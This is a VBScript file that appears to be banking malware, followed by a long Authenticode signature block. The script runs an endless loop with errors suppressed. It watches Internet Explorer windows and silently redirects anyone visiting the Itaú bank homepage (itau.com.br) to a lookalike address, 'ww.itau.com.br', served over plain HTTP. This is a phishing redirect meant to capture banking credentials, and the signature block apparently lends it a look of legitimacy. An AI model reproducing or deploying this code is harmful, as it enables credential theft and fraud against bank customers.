On Error Resume Next
Set Shell = CreateObject("Shell.Application")
Dim a
a = 1
While a = 1
WScript.Sleep(1000)
For Each Window In Shell.Windows
	WScript.Sleep(1000)
    ' Make sure it's an Internet Explorer (iexplore) window...
    If InStr(1, Window.FullName, "iexplore.exe", vbTextCompare) > 0 Then
		
        ' Display the URL of the current page...
        'MsgBox Window.LocationUrl
		If Window.LocationUrl = "https://www.itau.com.br/" Then
		WScript.Sleep(1000)
		Window.Navigate("http://ww.itau.com.br")
		WScript.Sleep(1000)
		Exit For
		End If
    End If

Next
Wend
'' SIG '' Begin signature block
'' SIG '' MIIi7wYJKoZIhvcNAQcCoIIi4DCCItwCAQExCzAJBgUr
'' SIG '' DgMCGgUAMGcGCisGAQQBgjcCAQSgWTBXMDIGCisGAQQB
'' SIG '' gjcCAR4wJAIBAQQQTvApFpkntU2P5azhDxfrqwIBAAIB
'' SIG '' AAIBAAIBAAIBADAhMAkGBSsOAwIaBQAEFBTmeGjDySRl
'' SIG '' 8gjeADHRo3KMcxrPoIIeTDCCBUkwggQxoAMCAQICEQD3
'' SIG '' ToYCP2J6mj6YqAJMqBmNMA0GCSqGSIb3DQEBCwUAMH0x
'' SIG '' CzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1h
'' SIG '' bmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGjAYBgNV
'' SIG '' BAoTEUNPTU9ETyBDQSBMaW1pdGVkMSMwIQYDVQQDExpD
'' SIG '' T01PRE8gUlNBIENvZGUgU2lnbmluZyBDQTAeFw0xNzEx
'' SIG '' MzAwMDAwMDBaFw0xODExMzAyMzU5NTlaMIGxMQswCQYD
'' SIG '' VQQGEwJHQjEQMA4GA1UEEQwHRTE0IDVBQTEPMA0GA1UE
'' SIG '' BwwGTG9uZG9uMU0wSwYDVQQJDEQxMHRoIEZsb29yLCBL
'' SIG '' ICYgQiBBY2NvdW50YW5jeSBHcm91cCwgT25lIENhbmFk
'' SIG '' YSBTcXVhcmUsIENhbmFyeSBXaGFyZjEXMBUGA1UECgwO
'' SIG '' U1VCRUNPIExJTUlURUQxFzAVBgNVBAMMDlNVQkVDTyBM
'' SIG '' SU1JVEVEMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
'' SIG '' CgKCAQEA3Ps4eSpPNw3LqQAbQCqUo32W8pwstfRr3kvx
'' SIG '' Wvl/a+YPt2zbY7VMF0HLv8f0smn8lARF3sWJDW8qSXwf
'' SIG '' QtX3e2GnsVYyUJELRqaUSaZeV4/0uhPH4Wcb8M/JlSu/
'' SIG '' YV2Foi5Kq6xksxz9fW1ZsUSti664g9rIb+NJL0LRsZXM
'' SIG '' atXRAhBuA6S/CvxNwJzBcjzi1t1LAdVw3+DW4nmmpefb
'' SIG '' eJjw1hkZ5iW5if5ZLMLGPvAZOx8a48baKhVt5psqPpw8
'' SIG '' rPLtCQSQWWXuVlhtwXHWiW/aRaiBOw6NCMGSjSJ34sjM
'' SIG '' LKobQMmvD6N+nkcWs3IKiCh/QT9LRFMtq7UCLXZDcQID
'' SIG '' AQABo4IBjTCCAYkwHwYDVR0jBBgwFoAUKZFg/4pN+uv5
'' SIG '' pmq4z/nmS71JzhIwHQYDVR0OBBYEFAo7WBN1XMtQZPy6
'' SIG '' kP2uTVpFFUP5MA4GA1UdDwEB/wQEAwIHgDAMBgNVHRMB
'' SIG '' Af8EAjAAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMBEGCWCG
'' SIG '' SAGG+EIBAQQEAwIEEDBGBgNVHSAEPzA9MDsGDCsGAQQB
'' SIG '' sjEBAgEDAjArMCkGCCsGAQUFBwIBFh1odHRwczovL3Nl
'' SIG '' Y3VyZS5jb21vZG8ubmV0L0NQUzBDBgNVHR8EPDA6MDig
'' SIG '' NqA0hjJodHRwOi8vY3JsLmNvbW9kb2NhLmNvbS9DT01P
'' SIG '' RE9SU0FDb2RlU2lnbmluZ0NBLmNybDB0BggrBgEFBQcB
'' SIG '' AQRoMGYwPgYIKwYBBQUHMAKGMmh0dHA6Ly9jcnQuY29t
'' SIG '' b2RvY2EuY29tL0NPTU9ET1JTQUNvZGVTaWduaW5nQ0Eu
'' SIG '' Y3J0MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5jb21v
'' SIG '' ZG9jYS5jb20wDQYJKoZIhvcNAQELBQADggEBADbikkcs
'' SIG '' 5kF4FqC97Gr0Nou3opyzCjooMUERxt5CT1JgPXQuxe4p
'' SIG '' 63yQyus/vziRbNcxj16sWgLSB0LSmAYFO7TKB2nKZt24
'' SIG '' GK75v6rleuUFTnj7CDHhuHRmuqqgS10DX6T6gqSo/FCD
'' SIG '' gcYGSxz6dZdRaoR0TF2rlBaCo4pw53Y703bknEpePpS+
'' SIG '' XvC7qrozwRLRapchABYYcLD5Iu/PQN9zw25qaYDBnOVH
'' SIG '' 3wSH+PKHweZ7fXoLiiMSGU+q6odACDX2yB+ex3Zli0Eb
'' SIG '' xZM6Ol5pq7Rndi6wd4h4NUmedcU/qqY5LgyU7rQ45iC3
'' SIG '' mLpNRsjCdke/sBPvXWnhQ9UJSUEwggXYMIIDwKADAgEC
'' SIG '' AhBMqvnK22Nv4B/3TthbA4adMA0GCSqGSIb3DQEBDAUA
'' SIG '' MIGFMQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRl
'' SIG '' ciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRow
'' SIG '' GAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDErMCkGA1UE
'' SIG '' AxMiQ09NT0RPIFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhv
'' SIG '' cml0eTAeFw0xMDAxMTkwMDAwMDBaFw0zODAxMTgyMzU5
'' SIG '' NTlaMIGFMQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3Jl
'' SIG '' YXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3Jk
'' SIG '' MRowGAYDVQQKExFDT01PRE8gQ0EgTGltaXRlZDErMCkG
'' SIG '' A1UEAxMiQ09NT0RPIFJTQSBDZXJ0aWZpY2F0aW9uIEF1
'' SIG '' dGhvcml0eTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
'' SIG '' AgoCggIBAJHoVJLSClaxrA0k3cXPRGd0mSs3o30jcABx
'' SIG '' vFPfxPoqEo9LfxBWvZ9wcrdhf8lLDxenPeOwBGHu/xGX
'' SIG '' x/SGPgr6Plz5k+Y0etkUa+ecs4Wggnp2r3GQ1+z9Dfqc
'' SIG '' bPrfsIL0FH75vsSmL09/mX+1/GdDcr0MANaJ62ss0+2P
'' SIG '' mBwUq37l42782KjkkiTaQ2tiuFX96sG8bLaL8w6NmuSb
'' SIG '' bGmZ+HhIMEXVreENPEVg/DKWUSe8Z8PKLrZr6kbHxyCg
'' SIG '' sR9l3kgIuqROqfKDRjeE6+jMgUhDZ05yKptcvUwbKIpc
'' SIG '' Inu0q5jZ7uBRg8MJRk5tPpn6lRfafDNXQTyNUe0Ltlyv
'' SIG '' LGMa31fIP7zpXcSbr0WZ4qNaJLS6qVY9z2+q/0lYvvCo
'' SIG '' //S4rek3+7q49As6+ehDQh6J2ITLE/HZu+GJYLiMKFas
'' SIG '' FB2cCudx688O3T2plqFIvTz3r7UNIkzAEYHsVjv206Li
'' SIG '' W7eyBCJSlYCTaeiOTGXxkQMtcHQC6otnFSlpUgK7199Q
'' SIG '' alVGv6CjKGF/cNDDoqosIapHziicBkV2v4IYJ7TVrrTL
'' SIG '' UOZr9EyGcTDppt8WhuDY/0Dd+9BCiH+jMzouXB5BEYFj
'' SIG '' zhhxayvspoq3MVw6akfgw3lZ1iAar/JqmKpyvFdK0kud
'' SIG '' uxD8sExB5e0dPV4onZzMv7NR2qdH5YRTAgMBAAGjQjBA
'' SIG '' MB0GA1UdDgQWBBS7r34CPfqm8TyEjq3uOJjs2TIy1DAO
'' SIG '' BgNVHQ8BAf8EBAMCAQYwDwYDVR0TAQH/BAUwAwEB/zAN
'' SIG '' BgkqhkiG9w0BAQwFAAOCAgEACvHVRoS3rlG7bLJNQRQA
'' SIG '' k0ycy+XAVM+gJY4C+f2wog31IJg8Ey2sVqKw1n4Rkuku
'' SIG '' up4umnKxvRlEbGE1opq0FhJpWozh1z6kGugvA/SuYR0Q
'' SIG '' Gyqki3rF/gWm4cDWyP6ero8ruj2Z+NhzCVhGbqac9Ncn
'' SIG '' 05XaN4NyHNNz4KJHmQM4XdVJeQApHMfsmyAcByRpV3iy
'' SIG '' Ofw6hKC1nHyNvy6TYie3OdoXGK69PAlo/4SbPNXWCwPj
'' SIG '' V54U99HrT8i9hyO3tklDeYVcuuuSC6HG6GioTBaxGpkK
'' SIG '' 6FMskruhCRh1DGWoe8sjtxrCKIXDG//QK2LvpHsJkZhn
'' SIG '' jBQBzWgGamMhdQOAiIpugcaF8qmkLef0pSQQR4PKzfSN
'' SIG '' eVixBpvnGirZnQHXlH3tA0rK8NvoqQE+9VaZyR6OST27
'' SIG '' 5Qm54E9Jkj0WgkDMzFnG5jrtEi5pPGyVsf2qHXt/hr4e
'' SIG '' DjJG+/sTj3V/TItLRmP+ADRAcMHDuaHdpnDiBLNBvOmA
'' SIG '' kepknHrhIgOpnG5vDmVPbIeHXvNuoPl1pZtA6FOyJ51K
'' SIG '' ucB3IY3/h/LevIzvF9+3SQvR8m4wCxoOTnbtEfz16Vay
'' SIG '' fb/HbQqTjKXQwLYdvjpOlKLXbmwLwop8+iDzxOTlzQ2o
'' SIG '' y5GSsXyF7LUUaWYOgufNzsgtplF/IcE1U4UGSl2frbsb
'' SIG '' X3QwggXgMIIDyKADAgECAhAufIfMDpNKUv6U/Ry3zTSv
'' SIG '' MA0GCSqGSIb3DQEBDAUAMIGFMQswCQYDVQQGEwJHQjEb
'' SIG '' MBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYD
'' SIG '' VQQHEwdTYWxmb3JkMRowGAYDVQQKExFDT01PRE8gQ0Eg
'' SIG '' TGltaXRlZDErMCkGA1UEAxMiQ09NT0RPIFJTQSBDZXJ0
'' SIG '' aWZpY2F0aW9uIEF1dGhvcml0eTAeFw0xMzA1MDkwMDAw
'' SIG '' MDBaFw0yODA1MDgyMzU5NTlaMH0xCzAJBgNVBAYTAkdC
'' SIG '' MRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAO
'' SIG '' BgNVBAcTB1NhbGZvcmQxGjAYBgNVBAoTEUNPTU9ETyBD
'' SIG '' QSBMaW1pdGVkMSMwIQYDVQQDExpDT01PRE8gUlNBIENv
'' SIG '' ZGUgU2lnbmluZyBDQTCCASIwDQYJKoZIhvcNAQEBBQAD
'' SIG '' ggEPADCCAQoCggEBAKaYkGN3kTR/itHd6WcxEevMHv0x
'' SIG '' HbO5Ylc/k7xb458eJDIRJ2u8UZGnz56eJbNfgagYDx0e
'' SIG '' IDAO+2F7hgmz4/2iaJ0cLJ2/cuPkdaDlNSOOyYruGgxk
'' SIG '' x9hCoXu1UgNLOrCOI0tLY+AilDd71XmQChQYUSzm/sES
'' SIG '' 8Bw/YWEKjKLc9sMwqs0oGHVIwXlaCM27jFWM99R2kDoz
'' SIG '' RlBzmFz0hUprD4DdXta9/akvwCX1+XjXjV8QwkRVPJA8
'' SIG '' MUbLcK4HqQrjr8EBb5AaI+JfONvGCF1Hs4NB8C4ANxS5
'' SIG '' Eqp5klLNhw972GIppH4wvRu1jHK0SPLj6CH5XkxieYsC
'' SIG '' Bp9/1QsCAwEAAaOCAVEwggFNMB8GA1UdIwQYMBaAFLuv
'' SIG '' fgI9+qbxPISOre44mOzZMjLUMB0GA1UdDgQWBBQpkWD/
'' SIG '' ik366/mmarjP+eZLvUnOEjAOBgNVHQ8BAf8EBAMCAYYw
'' SIG '' EgYDVR0TAQH/BAgwBgEB/wIBADATBgNVHSUEDDAKBggr
'' SIG '' BgEFBQcDAzARBgNVHSAECjAIMAYGBFUdIAAwTAYDVR0f
'' SIG '' BEUwQzBBoD+gPYY7aHR0cDovL2NybC5jb21vZG9jYS5j
'' SIG '' b20vQ09NT0RPUlNBQ2VydGlmaWNhdGlvbkF1dGhvcml0
'' SIG '' eS5jcmwwcQYIKwYBBQUHAQEEZTBjMDsGCCsGAQUFBzAC
'' SIG '' hi9odHRwOi8vY3J0LmNvbW9kb2NhLmNvbS9DT01PRE9S
'' SIG '' U0FBZGRUcnVzdENBLmNydDAkBggrBgEFBQcwAYYYaHR0
'' SIG '' cDovL29jc3AuY29tb2RvY2EuY29tMA0GCSqGSIb3DQEB
'' SIG '' DAUAA4ICAQACPwI5w+74yjuJ3gxtTbHxTpJPr8I4LATM
'' SIG '' xWMRqwljr6ui1wI/zG8Zwz3WGgiU/yXYqYinKxAa4Jux
'' SIG '' ByIaURw61OHpCb/mJHSvHnsWMW4j71RRLVIC4nUIBUzx
'' SIG '' t1HhUQDGh/Zs7hBEdldq8d9YayGqSdR8N069/7Z1VEAY
'' SIG '' NldnEc1PAuT+89r8dRfb7Lf3ZQkjSR9DV4PqfiB3YchN
'' SIG '' 8rtlTaj3hUUHr3ppJ2WQKUCL33s6UTmMqB9wea1tQiCi
'' SIG '' zwxsA4xMzXMHlOdajjoEuqKhfB/LYzoVp9QVG6dSRzKp
'' SIG '' 9L9kR9GqH1NOMjBzwm+3eIKdXP9Gu2siHYgL+BuqNKb8
'' SIG '' jPXdf2WMjDFXMdA27Eehz8uLqO8cGFjFBnfKS5tRr0wI
'' SIG '' SnqP4qNS4o6OzCbkstjlOMKo7caBnDVrqVhhSgqXtEtC
'' SIG '' tlWdvpnncG1Z+G0qDH8ZYF8MmohsMKxSCZAWG/8rndvQ
'' SIG '' IMqJ6ih+Mo4Z33tIMx7XZfiuyfiDFJN2fWTQjs6+NX3/
'' SIG '' cjFNn569HmwvqI8MBlD7jCezdsn05tfDNOKMhyGGYf6/
'' SIG '' VXThIXcDCmhsu+TJqebPWSXrfOxFDnlmaOgizbjvmIVN
'' SIG '' lhE8CYrQf7woKBP7aspUjZJczcJlmAaezkhb1LU3k0ZB
'' SIG '' fAfdz/pD77pnYf99SeC7MH1cgOPmFjlLpzCCBmowggVS
'' SIG '' oAMCAQICEAMBmgI6/1ixa9bV6uYX8GYwDQYJKoZIhvcN
'' SIG '' AQEFBQAwYjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERp
'' SIG '' Z2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0
'' SIG '' LmNvbTEhMB8GA1UEAxMYRGlnaUNlcnQgQXNzdXJlZCBJ
'' SIG '' RCBDQS0xMB4XDTE0MTAyMjAwMDAwMFoXDTI0MTAyMjAw
'' SIG '' MDAwMFowRzELMAkGA1UEBhMCVVMxETAPBgNVBAoTCERp
'' SIG '' Z2lDZXJ0MSUwIwYDVQQDExxEaWdpQ2VydCBUaW1lc3Rh
'' SIG '' bXAgUmVzcG9uZGVyMIIBIjANBgkqhkiG9w0BAQEFAAOC
'' SIG '' AQ8AMIIBCgKCAQEAo2Rd/Hyz4II14OD2xirmSXU7zG7g
'' SIG '' U6mfH2RZ5nxrf2uMnVX4kuOe1VpjWwJJUNmDzm9m7t3L
'' SIG '' helfpfnUh3SIRDsZyeX1kZ/GFDmsJOqoSyyRicxeKPRk
'' SIG '' tlC39RKzc5YKZ6O+YZ+u8/0SeHUOplsU/UUjjoZEVX0Y
'' SIG '' hgWMVYd5SEb3yg6Np95OX+Koti1ZAmGIYXIYaLm4fO7m
'' SIG '' 5zQvMXeBMB+7NgGN7yfj95rwTDFkjePr+hmHqH7P7IwM
'' SIG '' Nlt6wXq4eMfJBi5GEMiN6ARg27xzdPpO2P6qQPGyznBG
'' SIG '' g+naQKFZOtkVCVeZVjCT88lhzNAIzGvsYkKRrALA76Tw
'' SIG '' iRGPdwIDAQABo4IDNTCCAzEwDgYDVR0PAQH/BAQDAgeA
'' SIG '' MAwGA1UdEwEB/wQCMAAwFgYDVR0lAQH/BAwwCgYIKwYB
'' SIG '' BQUHAwgwggG/BgNVHSAEggG2MIIBsjCCAaEGCWCGSAGG
'' SIG '' /WwHATCCAZIwKAYIKwYBBQUHAgEWHGh0dHBzOi8vd3d3
'' SIG '' LmRpZ2ljZXJ0LmNvbS9DUFMwggFkBggrBgEFBQcCAjCC
'' SIG '' AVYeggFSAEEAbgB5ACAAdQBzAGUAIABvAGYAIAB0AGgA
'' SIG '' aQBzACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBv
'' SIG '' AG4AcwB0AGkAdAB1AHQAZQBzACAAYQBjAGMAZQBwAHQA
'' SIG '' YQBuAGMAZQAgAG8AZgAgAHQAaABlACAARABpAGcAaQBD
'' SIG '' AGUAcgB0ACAAQwBQAC8AQwBQAFMAIABhAG4AZAAgAHQA
'' SIG '' aABlACAAUgBlAGwAeQBpAG4AZwAgAFAAYQByAHQAeQAg
'' SIG '' AEEAZwByAGUAZQBtAGUAbgB0ACAAdwBoAGkAYwBoACAA
'' SIG '' bABpAG0AaQB0ACAAbABpAGEAYgBpAGwAaQB0AHkAIABh
'' SIG '' AG4AZAAgAGEAcgBlACAAaQBuAGMAbwByAHAAbwByAGEA
'' SIG '' dABlAGQAIABoAGUAcgBlAGkAbgAgAGIAeQAgAHIAZQBm
'' SIG '' AGUAcgBlAG4AYwBlAC4wCwYJYIZIAYb9bAMVMB8GA1Ud
'' SIG '' IwQYMBaAFBUAEisTmLKZB+0e36K+Vw0rZwLNMB0GA1Ud
'' SIG '' DgQWBBRhWk0ktkkynUoqeRqDS/QeicHKfTB9BgNVHR8E
'' SIG '' djB0MDigNqA0hjJodHRwOi8vY3JsMy5kaWdpY2VydC5j
'' SIG '' b20vRGlnaUNlcnRBc3N1cmVkSURDQS0xLmNybDA4oDag
'' SIG '' NIYyaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lD
'' SIG '' ZXJ0QXNzdXJlZElEQ0EtMS5jcmwwdwYIKwYBBQUHAQEE
'' SIG '' azBpMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdp
'' SIG '' Y2VydC5jb20wQQYIKwYBBQUHMAKGNWh0dHA6Ly9jYWNl
'' SIG '' cnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJ
'' SIG '' RENBLTEuY3J0MA0GCSqGSIb3DQEBBQUAA4IBAQCdJX4b
'' SIG '' M02yJoFcm4bOIyAPgIfliP//sdRqLDHtOhcZcRfNqRu8
'' SIG '' WhY5AJ3jbITkWkD73gYBjDf6m7GdJH7+IKRXrVu3mrBg
'' SIG '' JuppVyFdNC8fcbCDlBkFazWQEKB7l8f2P+fiEUGmvWLZ
'' SIG '' 8Cc9OB0obzpSCfDscGLTYkuw4HOmksDTjjHYL+NtFxMG
'' SIG '' 7uQDthSr849Dp3GdId0UyhVdkkHa+Q+B0Zl0DSbEDn8b
'' SIG '' tfWg8cZ3BigV6diT5VUW8LsKqxzbXEgnZsijiwoc5ZXa
'' SIG '' rsQuWaBh3drzbaJh6YoLbewSGL33VVRAA5Ira8JRwgpI
'' SIG '' r7DUbuD0FAo6G+OPPcqvao173NhEMIIGzTCCBbWgAwIB
'' SIG '' AgIQBv35A5YDreoACus/J7u6GzANBgkqhkiG9w0BAQUF
'' SIG '' ADBlMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNl
'' SIG '' cnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29t
'' SIG '' MSQwIgYDVQQDExtEaWdpQ2VydCBBc3N1cmVkIElEIFJv
'' SIG '' b3QgQ0EwHhcNMDYxMTEwMDAwMDAwWhcNMjExMTEwMDAw
'' SIG '' MDAwWjBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGln
'' SIG '' aUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQu
'' SIG '' Y29tMSEwHwYDVQQDExhEaWdpQ2VydCBBc3N1cmVkIElE
'' SIG '' IENBLTEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
'' SIG '' AoIBAQDogi2Z+crCQpWlgHNAcNKeVlRcqcTSQQaPyTP8
'' SIG '' TUWRXIGf7Syc+BZZ3561JBXCmLm0d0ncicQK2q/LXmvt
'' SIG '' rbBxMevPOkAMRk2T7It6NggDqww0/hhJgv7HxzFIgHwe
'' SIG '' og+SDlDJxofrNj/YMMP/pvf7os1vcyP+rFYFkPAyIRaJ
'' SIG '' xnCI+QWXfaPHQ90C6Ds97bFBo+0/vtuVSMTuHrPyvAwr
'' SIG '' mdDGXRJCgeGDboJzPyZLFJCuWWYKxI2+0s4Grq2Eb0iE
'' SIG '' m09AufFM8q+Y+/bOQF1c9qjxL6/siSLyaxhlscFzrdfx
'' SIG '' 2M8eCnRcQrhofrfVdwonVnwPYqQ/MhRglf0HBKIJAgMB
'' SIG '' AAGjggN6MIIDdjAOBgNVHQ8BAf8EBAMCAYYwOwYDVR0l
'' SIG '' BDQwMgYIKwYBBQUHAwEGCCsGAQUFBwMCBggrBgEFBQcD
'' SIG '' AwYIKwYBBQUHAwQGCCsGAQUFBwMIMIIB0gYDVR0gBIIB
'' SIG '' yTCCAcUwggG0BgpghkgBhv1sAAEEMIIBpDA6BggrBgEF
'' SIG '' BQcCARYuaHR0cDovL3d3dy5kaWdpY2VydC5jb20vc3Ns
'' SIG '' LWNwcy1yZXBvc2l0b3J5Lmh0bTCCAWQGCCsGAQUFBwIC
'' SIG '' MIIBVh6CAVIAQQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQA
'' SIG '' aABpAHMAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABj
'' SIG '' AG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAA
'' SIG '' dABhAG4AYwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBp
'' SIG '' AEMAZQByAHQAIABDAFAALwBDAFAAUwAgAGEAbgBkACAA
'' SIG '' dABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5
'' SIG '' ACAAQQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgA
'' SIG '' IABsAGkAbQBpAHQAIABsAGkAYQBiAGkAbABpAHQAeQAg
'' SIG '' AGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA
'' SIG '' YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBl
'' SIG '' AGYAZQByAGUAbgBjAGUALjALBglghkgBhv1sAxUwEgYD
'' SIG '' VR0TAQH/BAgwBgEB/wIBADB5BggrBgEFBQcBAQRtMGsw
'' SIG '' JAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0
'' SIG '' LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMu
'' SIG '' ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9v
'' SIG '' dENBLmNydDCBgQYDVR0fBHoweDA6oDigNoY0aHR0cDov
'' SIG '' L2NybDMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl
'' SIG '' ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDQu
'' SIG '' ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9v
'' SIG '' dENBLmNybDAdBgNVHQ4EFgQUFQASKxOYspkH7R7for5X
'' SIG '' DStnAs0wHwYDVR0jBBgwFoAUReuir/SSy4IxLVGLp6ch
'' SIG '' nfNtyA8wDQYJKoZIhvcNAQEFBQADggEBAEZQPsm3KCSn
'' SIG '' OB22WymvUs9S6TFHq1Zce9UNC0Gz7+x1H3Q48rJcYaKc
'' SIG '' lcNQ5IK5I9G6OoZyrTh4rHVdFxc0ckeFlFbR67s2hHfM
'' SIG '' JKXzBBlVqefj56tizfuLLZDCwNK1lL1eT7EF0g49GqkU
'' SIG '' W6aGMWKoqDPkmzmnxPXOHXh2lCVz5Cqrz5x2S+1fwksW
'' SIG '' 5EtwTACJHvzFebxMElf+X+EevAJdqP77BzhPDcZdkbkP
'' SIG '' Z0XN1oPt55INjbFpjE/7WeAjD9KqrgB87pxCDs+R1ye3
'' SIG '' Fu4Pw718CqDuLAhVhSK46xgaTfwqIa1JMYNHlXdx3LEb
'' SIG '' S0scEJx3FMGdTy9alQgpECYxggQPMIIECwIBATCBkjB9
'' SIG '' MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBN
'' SIG '' YW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRowGAYD
'' SIG '' VQQKExFDT01PRE8gQ0EgTGltaXRlZDEjMCEGA1UEAxMa
'' SIG '' Q09NT0RPIFJTQSBDb2RlIFNpZ25pbmcgQ0ECEQD3ToYC
'' SIG '' P2J6mj6YqAJMqBmNMAkGBSsOAwIaBQCgQDAZBgkqhkiG
'' SIG '' 9w0BCQMxDAYKKwYBBAGCNwIBBDAjBgkqhkiG9w0BCQQx
'' SIG '' FgQUfjEZ5laetoW1jJsYJ7KN6+F7MuEwDQYJKoZIhvcN
'' SIG '' AQEBBQAEggEAxu3QDfnwpH6ztopYO/qgs4POOeBnEKXh
'' SIG '' hk5/5u9hDGMWmA/qRKX4EMyyPxOY1mY8xJqyG7yDOpyD
'' SIG '' eklAfvfD1IGvQ37MAOTOeIyZWlD9+uxU69k/yunTkzeg
'' SIG '' NOVyUl9C81Ag4sMU40nY0tNTIt3DCeUg/q24tCQxu9Oq
'' SIG '' CBEilFOmweFXaaCeI4EruwO93DS3DY4NrEaxwYhhw+lL
'' SIG '' hr9Zw+VUsE4JTHfoZstGsRaATvUA19dRlm2I6JHXm6Vp
'' SIG '' pFi/A/msduJhkgPgN3UMMEMbc2jnKwJ90Vg4FgRlj47Q
'' SIG '' ILDKCTTDvIPcpB1NR7JBbgEXQr7OfWmcpPW3KLwB/d6S
'' SIG '' y6GCAg8wggILBgkqhkiG9w0BCQYxggH8MIIB+AIBATB2
'' SIG '' MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy
'' SIG '' dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20x
'' SIG '' ITAfBgNVBAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0Et
'' SIG '' MQIQAwGaAjr/WLFr1tXq5hfwZjAJBgUrDgMCGgUAoF0w
'' SIG '' GAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG
'' SIG '' 9w0BCQUxDxcNMTgwNDAzMTY0NzU3WjAjBgkqhkiG9w0B
'' SIG '' CQQxFgQUeac6JWM+8VZPv6oiMfFcWqD2Q1kwDQYJKoZI
'' SIG '' hvcNAQEBBQAEggEANAsUvBMLRvrFJ5bU8arQty9vgMo9
'' SIG '' 01CkijzVgPEXwvkokFRh/KYlw0DPDlaz2wJ+O66Ui5JY
'' SIG '' eRmyYIgSitZUEV5NMNRePQxeFojIngvNFAZ6eiXaAKUt
'' SIG '' fgmZMWSZoPrJAE0SQs4hMr+OIVtNsNo2lnA4MwhHhJmJ
'' SIG '' pO8DWDlRu/dx2eJNHaVZokdeN5y+1sxzpwqZt3S5yL1a
'' SIG '' CXIp6emEC+fcDe6NTd1rYuiNxlePHTC0WuTDgBhq10G+
'' SIG '' j+oDcGEh8oc9L0JmEnhgWkX8P78wxFmZcepLmZSlv6Wq
'' SIG '' jL16b8skdpd5NtYup7R+5d64OU6JHnipUYr3rXBLJMQs
'' SIG '' rH+Bzw==
'' SIG '' End signature block
